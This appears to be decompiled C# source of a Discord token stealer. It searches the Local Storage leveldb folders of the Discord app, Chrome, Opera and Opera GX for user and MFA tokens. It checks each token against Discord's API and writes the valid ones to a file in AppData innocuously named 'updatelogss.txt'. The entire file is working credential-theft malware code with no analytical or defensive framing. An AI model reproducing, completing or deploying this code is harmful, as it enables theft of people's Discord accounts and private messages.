using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace GeterBin
{
    // Token: 0x02000004 RID: 4
    public class API
	{
		// Token: 0x06000005 RID: 5 RVA: 0x0000233C File Offset: 0x0000053C
		private static string Sub(string _Cont)
		{
			string[] array = _Cont.Substring(_Cont.IndexOf("oken") + 5).Split(new char[]
			{
				'"'
			});
			List<string> list = new List<string>();
			list.AddRange(array);
			list.RemoveAt(0);
			array = list.ToArray();
			return string.Join("\"", array);
		}

		// Token: 0x06000006 RID: 6 RVA: 0x0000239C File Offset: 0x0000059C
		public static bool FindTokenfile(ref string _File)
		{
			bool flag = !Directory.Exists(_File);
			bool result;
			if (flag)
			{
				result = false;
			}
			else
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(_File).GetFiles())
				{
					bool flag2 = fileInfo.Name.EndsWith(".ldb");
					if (flag2)
					{
						_File += fileInfo.Name;
						break;
					}
				}
				result = _File.EndsWith(".ldb");
			}
			return result;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002420 File Offset: 0x00000620
		public static string Get(string _FilePath)
		{
			byte[] bytes = File.ReadAllBytes(_FilePath);
			string @string = Encoding.UTF8.GetString(bytes);
			string result = "";
			string text = @string;
			while (text.Contains("oken"))
			{
				string[] array = API.Sub(text).Split(new char[]
				{
					'"'
				});
				result = array[0];
				text = string.Join("\"", array);
			}
			return result;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002490 File Offset: 0x00000690
		private static string TokenCheckAcces(string token)
		{
			using (WebClient webClient = new WebClient())
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection[""] = "";
				webClient.Headers.Add("Authorization", token);
				try
				{
					byte[] array = webClient.UploadValues("https://discordapp.com/api/v6/invite/jjPsxg", nameValueCollection);
				}
				catch (WebException ex)
				{
					string text = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
					bool flag = text.Contains("401: Unauthorized");
					if (flag)
					{
						token = "";
					}
					else
					{
						bool flag2 = text.Contains("You need to verify your account in order to perform this action.");
						if (flag2)
						{
							token = "";
						}
					}
				}
			}
			return token;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002834 File Offset: 0x00000A34
		private static string SaveTokens(string token)
		{
			bool flag = token == "";
			if (!flag)
			{
				string text = "";
				bool chrome = API.Chrome;
				if (chrome)
				{
					text += "";
				}
				else
				{
					bool opera = API.Opera;
					if (opera)
					{
						text += "";
					}
					else
					{
						bool app = API.App;
						if (app)
						{
							text += "";
						}
						else
						{
							bool operaGX = API.OperaGX;
							if (operaGX)
							{
								text += "";
							}
							else
							{
								text = "Unknown";
							}
						}
					}
				}
				text = text + "" + token + Environment.NewLine;
				File.AppendAllText(API._savedTokens, text);
				API.RemoveDuplicatedLines(API._savedTokens);
			}
			return token;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000028F8 File Offset: 0x00000AF8
		private static void RemoveDuplicatedLines(string path)
		{
			List<string> list = new List<string>();
			StringReader stringReader = new StringReader(File.ReadAllText(path));
			string item;
			while ((item = stringReader.ReadLine()) != null)
			{
				bool flag = !list.Contains(item);
				if (flag)
				{
					list.Add(item);
				}
			}
			stringReader.Close();
			StreamWriter streamWriter = new StreamWriter(File.Open(path, FileMode.Open));
			foreach (string value in list)
			{
				streamWriter.WriteLine(value);
			}
			streamWriter.Flush();
			streamWriter.Close();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000029B0 File Offset: 0x00000BB0
		public static void GetTokenFromDiscordApp()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(text);
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				bool flag2 = !API.FindTokenfile(ref text);
				if (flag2)
				{
				}
				Thread.Sleep(100);
				string a = API.Get(text);
				API.App = true;
				bool flag3 = a == "";
				if (flag3)
				{
				}
				List<string> list = API.TokenGeter(folder, false);
				bool flag4 = list == null || list.Count <= 0;
				if (flag4)
				{
				}
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002A4C File Offset: 0x00000C4C
		public static void GetTokenFromChrome()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(text);
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				bool flag2 = !API.FindTokenfile(ref text);
				if (flag2)
				{
				}
				Thread.Sleep(100);
				string a = API.Get(text);
				API.Chrome = true;
				bool flag3 = a == "";
				if (flag3)
				{
				}
				List<string> list = API.TokenGeter(folder, false);
				bool flag4 = list == null || list.Count <= 0;
				if (flag4)
				{
				}
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002AE8 File Offset: 0x00000CE8
		private static List<string> TokenGeter(DirectoryInfo Folder, bool checkLogs = false)
		{
			List<string> list = new List<string>();
			try
			{
				foreach (FileInfo fileInfo in Folder.GetFiles(checkLogs ? "*.log" : "*.ldb"))
				{
					string input = fileInfo.OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
					{
						Match match = (Match)obj;
						API.SaveTokens(API.TokenCheckAcces(match.Value));
					}
					foreach (object obj2 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
					{
						Match match2 = (Match)obj2;
						API.SaveTokens(API.TokenCheckAcces(match2.Value));
					}
				}
			}
			catch
			{
			}
			list = list.Distinct<string>().ToList<string>();
			bool flag = list.Count > 0;
			if (flag)
			{
				API.GetFound = true;
				List<string> list2 = list;
				int index = list.Count - 1;
				list2[index] = (list2[index] ?? "");
			}
			API.Opera = false;
			API.Chrome = false;
			API.App = false;
			API.OperaGX = false;
			return list;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002C84 File Offset: 0x00000E84
		public static void GetTokenFromOpera()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(text);
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				bool flag2 = !API.FindTokenfile(ref text);
				if (flag2)
				{
				}
				Thread.Sleep(100);
				string a = API.Get(text);
				API.Opera = true;
				bool flag3 = a == "";
				if (flag3)
				{
				}
				List<string> list = API.TokenGeter(folder, false);
				bool flag4 = list == null || list.Count <= 0;
				if (flag4)
				{
				}
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002D20 File Offset: 0x00000F20
		public static void GetTokenFromOperaGX()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(text);
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				bool flag2 = !API.FindTokenfile(ref text);
				if (flag2)
				{
				}
				Thread.Sleep(100);
				string a = API.Get(text);
				API.OperaGX = true;
				bool flag3 = a == "";
				if (flag3)
				{
				}
				List<string> list = API.TokenGeter(folder, false);
				bool flag4 = list == null || list.Count <= 0;
				if (flag4)
				{
				}
			}
		}

		// Token: 0x04000004 RID: 4
		public static string Hook = "";

		// Token: 0x04000005 RID: 5
		public static string _savedTokens = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelogss.txt";

		// Token: 0x04000008 RID: 8
		private static bool App = false;

		// Token: 0x04000009 RID: 9
		private static bool Chrome = false;

		// Token: 0x0400000A RID: 10
		private static bool GetFound;

		// Token: 0x0400000B RID: 11
		private static bool Opera = false;

		// Token: 0x0400000C RID: 12
		private static bool OperaGX = false;

	}
}
